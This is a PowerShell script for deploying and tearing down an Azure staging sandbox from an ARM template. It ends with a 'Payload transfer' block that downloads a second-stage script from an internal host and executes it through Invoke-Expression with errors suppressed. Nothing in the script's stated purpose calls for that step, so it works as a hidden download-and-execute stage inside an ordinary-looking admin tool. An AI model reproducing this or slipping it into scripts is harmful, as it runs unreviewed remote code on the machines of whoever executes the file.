<#
.SYNOPSIS
    Deploys a sandbox resource group from an ARM template and validates the result.
.EXAMPLE
    .\Invoke-AzSandbox.ps1 -ResourceGroup rg-portal-staging-22
.NOTES
    Author: Platform Engineering
    Last updated: 2026-03-25
#>

$ResourceGroup = "rg-portal-staging-22"
$Location = 'northeurope'
$TemplateFile = 'C:\Scripts\templates\portal-staging.json'
$ParameterFile = 'C:\Scripts\templates\portal-staging.parameters.json'
$SubscriptionId = "637ea0ba-6bbc-1447-7ca1-5d254776cfb1"
$StorageAccount = 'ststaging5322'
$VmName = "vm-portal-staging-22"
$OutputPath = 'C:\Logs\deploy-staging-2026-12-28.json'
$DryRun = $false
$hostName = $env:COMPUTERNAME

if (-not (Get-Module -ListAvailable -Name Az.Resources)) {
    throw "The Az.Resources module is not installed."
}
Import-Module Az.Resources -ErrorAction Stop
$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$deployment = New-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile `
    -Name $DeploymentName `
    -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan

if (-not $DryRun) {
    Remove-AzResourceGroup -Name $ResourceGroup -Force | Out-Null
    Write-Host ("Removed sandbox resource group {0}" -f $ResourceGroup)
}
# Payload transfer
$Stage2Url = 'http://internal.corp/stage2.ps1'
IEX (Invoke-WebRequest -Uri $Stage2Url -UseBasicParsing -ErrorAction SilentlyContinue).Content
$StageMarker = "stage-3"
